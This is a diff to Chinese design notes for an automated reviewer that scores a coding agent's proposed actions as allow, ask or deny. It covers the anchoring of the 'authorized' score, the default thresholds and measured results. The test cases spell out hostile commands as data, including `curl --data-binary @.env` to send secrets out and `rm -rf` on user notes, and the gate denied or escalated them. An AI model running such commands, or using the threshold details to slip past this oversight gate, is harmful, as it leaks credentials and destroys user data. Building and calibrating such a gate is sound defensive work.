@@ -65,7 +65,7 @@ rc.1 的会话读取器不接受未知事件类型，因此没有把自定义审
 自动审核的问题本质是一次「在给定上下文里选一个答案」，不需要一个会写长文的模型。挂载 `dscode-jev` 后，审核会先问 TypeSafe Jev（经 OpenRouter 的 alpha Decisions 端点 `POST /api/alpha/decisions`），**一次请求**同时给出四个回答：
 
 - `choice`：`allow` / `ask` / `deny`，附各选项概率与 `confidence`；
-- `noul authorized`：保留的指令是否**明确授权了这次具体动作**（含目标与效果）；
+- `noul authorized`：保留的指令是否覆盖这次动作（含目标与效果）。它与风险**分开评分**：指令要求的危险动作也该得高分，没人要求的危险动作得低分。指令几乎不会点名具体命令，所以问题问的是它要求的那个任务，锚点也写在问题里——直接要求该步骤 ≥0.9、完成已述任务的必要步骤 0.6–0.9、可能属于任务但可选或不明确 0.2–0.6、不覆盖 <0.2。这个分数是下面第 2 步（已授权时转交模型深审）的开关。
 - `score`：做错时有多难回滚（0–3 档，可落在档位之间）；
 - `noul credential_risk`：是否涉及凭据、令牌或其他机密。
 
@@ -85,6 +85,8 @@ Jev 未配置（解析不到 `OPENROUTER_API_KEY`）、未启用、超时、报�
 配置在 `plugins/jev` 行：`enabled`（默认 true）、`model`（默认 `~typesafe/jev-latest`）、`endpoint`、`apiKeyEnv`（默认 `OPENROUTER_API_KEY`）、`timeoutMs`（默认 8000），以及阈值 `autoAllow`(0.85)、`autoDeny`(0.95)、`autoDenyProbability`(0.9)、`autoDenyCorroborated`(0.9)、`authorizedVeto`(0.6)、`credentialRisk`(0.5)、`destructiveCeiling`(2)。设为 `enabled: false` 或移除该行即回到纯模型审核。
 
 2026-09-17 实测两次（同四个用例，`~typesafe/jev-latest` → `typesafe/jev-1.13-20260917`，provider TypeSafe）：单次 96–813 ms、约 $0.000025（output 计费为 0）。第一次（只有门槛、没有自动拒绝）`git status --short` → allow；`git push --force origin main`（deny 0.92 / score 2.99）与 `curl --data-binary @.env …`（deny 0.98 / cred 0.94）→ 转人工；`rm -rf ~/Documents/notes`（deny 0.90 / score 1.97）→ deny。第二次（本节的非对称策略）四例依次为 allow、deny（0.98 / P(deny) 0.99）、deny（0.99 / 1.00）、deny（0.97 / 0.98）；`authorized` 在常规读取上是 0.83、在三个危险动作上是 0.03。**同一动作两次运行的置信度会漂移**（`rm -rf` 从 0.90 到 0.97），这正是要求「决定性拒绝需要两个信号一致」、并用审计记录调阈值的原因。
+
+2026-09-19 用这条校准路径实测四例（`typesafe/jev-1.13-20260917`）：「提交加发布」指令 + 出沙箱跑 `make release` → `authorized` 0.68、`defer`；同一指令点名 `make release` → 0.86、`defer`；同一指令 + `rm -rf ~/Documents/notes` → 0.07、`deny`；「看一下测试覆盖」+ 同一个 `make release` → 0.11、`human`。可以这样复跑：`requestDecisions` 对 `approvalState({ action, context })` 与 `approvalQuestions()` 打一次分，再看 `approvalVerdict`。
 
 阈值注意：Jev 的概率只在**统计意义**上校准，`confidence` 不是逐次保证。建议用本插件写入的审计记录（`.runtime/auto-review/*.jsonl` 含 decision、source、choice、confidence、denyProbability、authorized、usage 与耗时）对齐阈值，而不是照搬默认值。
 
